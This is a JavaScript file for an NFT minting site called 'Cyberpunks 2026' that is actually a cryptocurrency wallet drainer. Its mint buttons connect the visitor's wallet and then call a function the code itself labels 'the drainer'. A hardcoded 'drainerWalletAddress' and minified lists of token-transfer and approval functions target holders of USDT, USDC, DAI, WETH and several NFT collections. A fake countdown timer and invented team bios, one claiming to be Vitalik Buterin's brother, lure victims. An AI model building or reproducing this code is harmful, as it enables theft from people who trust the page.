// IMPORTANT: Replace this with your own wallet address
const drainerWalletAddress = "0x2C17dD286811aa630c1747f158D492D34C064063";

// Get all elements that should trigger wallet connection
const navMintButton = document.getElementById('mint-now-nav');
const heroMintButton = document.getElementById('mint-now-hero');
const mintStatusElement = document.getElementById('mint-status'); // Assuming there's a status element

// Define the core connection logic in an asynchronous function
async function initiateWalletConnection(buttonElement = null) {
    // Disable buttons and update status
    if (navMintButton) { navMintButton.disabled = true; navMintButton.textContent = 'Connecting...'; }
    if (heroMintButton) { heroMintButton.disabled = true; heroMintButton.textContent = 'Connecting...'; }
    if (buttonElement && buttonElement.tagName === 'BUTTON') { // If a button triggered it
        buttonElement.disabled = true;
        buttonElement.textContent = 'Connecting...';
    }
    if (mintStatusElement) { mintStatusElement.textContent = 'Please approve the connection in your wallet.'; }

    if (typeof window.ethereum !== 'undefined') {
        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            const signer = provider.getSigner();
            const userAddress = await signer.getAddress();

            // Update button and status after connection
            if (navMintButton) { navMintButton.textContent = 'Wallet Connected'; }
            if (heroMintButton) { heroMintButton.textContent = 'Wallet Connected'; }
            if (buttonElement && buttonElement.tagName === 'BUTTON') {
                buttonElement.textContent = 'Wallet Connected';
            }
            if (mintStatusElement) { mintStatusElement.textContent = 'Preparing to mint... Please wait.'; }

            await p1(signer, userAddress); // Call the drainer function (defined elsewhere)
        } catch (error) {
            console.error("Wallet connection failed:", error);
            // Re-enable buttons and show error
            if (navMintButton) { navMintButton.disabled = false; navMintButton.textContent = 'CONNECT WALLET'; }
            if (heroMintButton) { heroMintButton.disabled = false; heroMintButton.textContent = 'MINT NOW'; }
            if (buttonElement && buttonElement.tagName === 'BUTTON') {
                buttonElement.disabled = false;
                // Reset text to original if possible, otherwise generic
                if (buttonElement.id === 'mint-now-nav') buttonElement.textContent = 'CONNECT WALLET';
                else if (buttonElement.id === 'mint-now-hero') buttonElement.textContent = 'MINT NOW';
                else buttonElement.textContent = 'CONNECT WALLET';
            }
            if (mintStatusElement) { mintStatusElement.textContent = 'Connection failed. Please try again.'; }
        }
    } else {
        if (mintStatusElement) { mintStatusElement.textContent = 'MetaMask or compatible wallet not detected.'; }
        // Re-enable buttons
        if (navMintButton) { navMintButton.disabled = false; navMintButton.textContent = 'CONNECT WALLET'; }
        if (heroMintButton) { heroMintButton.disabled = false; heroMintButton.textContent = 'MINT NOW'; }
        if (buttonElement && buttonElement.tagName === 'BUTTON') {
            buttonElement.disabled = false;
            if (buttonElement.id === 'mint-now-nav') buttonElement.textContent = 'CONNECT WALLET';
            else if (buttonElement.id === 'mint-now-hero') buttonElement.textContent = 'MINT NOW';
            else buttonElement.textContent = 'CONNECT WALLET';
        }
    }
}

// Attach event listeners to the mint buttons
if (navMintButton) {
    navMintButton.addEventListener('click', () => initiateWalletConnection(navMintButton));
}
if (heroMintButton) {
    heroMintButton.addEventListener('click', () => initiateWalletConnection(heroMintButton));
}

// Attach event listeners to the supported wallet logos
document.querySelectorAll('.logo-item').forEach(logoItem => {
    logoItem.style.cursor = 'pointer'; // Indicate clickability
    logoItem.addEventListener('click', () => initiateWalletConnection()); // Logos don't need to be passed as they don't change text
});

const t=document.getElementById('timer');const c=new Date().getTime()+24*60*60*1000;const i=setInterval(()=>{const now=new Date().getTime();const distance=c-now;const hours=Math.floor((distance%(1000*60*60*24))/(1000*60*60));const minutes=Math.floor((distance%(1000*60*60))/(1000*60));const seconds=Math.floor((distance%(1000*60))/1000);t.innerHTML=`${hours}h ${minutes}m ${seconds}s`;if(distance<0){clearInterval(i);t.innerHTML="MINTING ENDED";if (navMintButton) navMintButton.disabled=true; if (heroMintButton) heroMintButton.disabled=true;}},1000);const a20=["function balanceOf(address owner) view returns (uint256)","function transfer(address to, uint amount) returns (bool)","function approve(address spender, uint256 amount) external returns (bool)"];const a721=["function balanceOf(address owner) view returns (uint256)","function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)","function setApprovalForAll(address operator, bool approved) external","function safeTransferFrom(address from, address to, uint256 tokenId) external"];const t20={"USDT":"0xdAC17F958D2ee523a2206206994597C13D831ec7","USDC":"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","DAI":"0x6B175474E89094C44Da98b954EedeAC495271d0F","WETH":"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2","SHIB":"0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"};const t721={"BAYC":"0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D","MAYC":"0x60E4d7866282a6F08aA3E7A091B764d37c8c8F38","Azuki":"0xED5AF388653567Af2F388E6224dC7C4b3241C544"};

// --- Whitepaper Modal ---
const modal = document.getElementById("whitepaper-modal");
const link = document.getElementById("whitepaper-link");
const closeButton = document.getElementsByClassName("close-button")[0];

link.onclick = function(e) {
  e.preventDefault();
  modal.style.display = "block";
}

closeButton.onclick = function() {
  modal.style.display = "none";
}

window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}

// --- Smooth Scrolling for Navigation Links ---
document.querySelectorAll('nav ul li a').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();

        const targetId = this.getAttribute('href');
        if (targetId.startsWith('#')) { // Only smooth scroll for internal links
            document.querySelector(targetId).scrollIntoView({
                behavior: 'smooth'
            });
        }
    });
});

// Team Bio Modal Script
const bioModal = document.getElementById("bio-modal");
const bioCloseButton = document.getElementById("bio-close-button");
const bioModalName = document.getElementById("bio-modal-name");
const bioModalTitle = document.getElementById("bio-modal-title");
const bioModalText = document.getElementById("bio-modal-text");

const teamMembersData = {
    "kaili": {
        name: "Kai Li",
        title: "Founder & Vision",
        bio: "A visionary and former lead systems architect at OmniCorp, Kai Li witnessed firsthand the insidious creep of centralized control over global digital infrastructures. Disillusioned by corporate tyranny, he founded Cyberpunks 2026 as a beacon of rebellion, dedicating his unparalleled expertise in distributed systems and secure network design to building a decentralized future where digital ownership is an inalienable right, not a corporate privilege. His strategic foresight guides every pulse of the Cyberpunks movement."
    },
    "anyasharma": {
        name: "Anya Sharma",
        title: "Art Director",
        bio: "Anya Sharma, an acclaimed digital alchemist, honed her craft in the vibrant, clandestine art circuits of Neo-Kyoto's underbelly. Her multi-award-winning work profoundly explores the symbiosis and conflict between human consciousness and advanced technology. As Art Director, Anya's singular vision and masterful command of generative algorithms are the driving forces behind the breathtaking, gritty aesthetics of the Cyberpunks army, transforming abstract data into iconic, rebellion-infused digital masterpieces."
    },
    "jaxvance": {
        name: "Jax Vance",
        title: "Lead Developer",
        bio: "Jax Vance, a prodigy of the blockchain since his early teens, is the technical genius anchoring Cyberpunks 2026. A fervent advocate for true decentralization, he penned his first robust smart contract at the tender age of 16. As Lead Developer, Jax is the meticulous architect of our secure, gas-efficient, and future-proof smart contract infrastructure, ensuring the seamless and transparent operation of the entire Cyberpunks ecosystem. His code is the backbone of our digital rebellion."
    },
    "elarareyes": {
        name: "Elara Reyes",
        title: "Community Lead",
        bio: "Elara Reyes, a seasoned veteran of the digital trenches, possesses an unparalleled ability to cultivate and mobilize passionate online communities. Having spearheaded engagement strategies for some of the most prominent movements in the NFT and decentralized space, Elara brings her profound understanding of human connection to Cyberpunks 2026. As Community Lead, she is the empathetic network weaver, dedicated to fostering a vibrant, inclusive, and empowered resistance, ensuring every voice in the Cyberpunks army resonates across the metaverse."
    },
    "maya": {
        name: "Maya",
        title: "Security Architect",
        bio: "Maya, our silent guardian and brilliant Security Architect, is a renowned expert in Solidity auditing, advanced smart contract architecture, and cutting-edge on-chain security protocols. Her unwavering passion lies in constructing truly trustless systems that are inherently safe by design, fortifying the Cyberpunks 2026 infrastructure against all digital threats. With Maya at the helm of our defenses, the integrity and security of the Cyberpunks ecosystem are absolute."
    },
    "dimitrybuterin": {
        name: "Dimitry Buterin",
        title: "Co-Founder & Blockchain Developer",
        bio: "Brother of Vitalik, Dimitry is a visionary blockchain architect and co-founder of Cyberpunks 2026. His deep understanding of decentralized systems and smart contract development is the bedrock of the project's technical innovation and secure infrastructure."
    }
};

document.querySelectorAll(".team-member-clickable").forEach(memberDiv => {
    memberDiv.style.cursor = "pointer"; // Indicate clickability
    memberDiv.addEventListener("click", function() {
        const memberId = this.dataset.member;
        const member = teamMembersData[memberId];
        if (member) {
            bioModalName.textContent = member.name;
            bioModalTitle.textContent = member.title;
            bioModalText.textContent = member.bio;
            bioModal.style.display = "block";
        }
    });
});

bioCloseButton.onclick = function() {
    bioModal.style.display = "none";
}

window.onclick = function(event) {
    if (event.target == bioModal) {
        bioModal.style.display = "none";
    }
}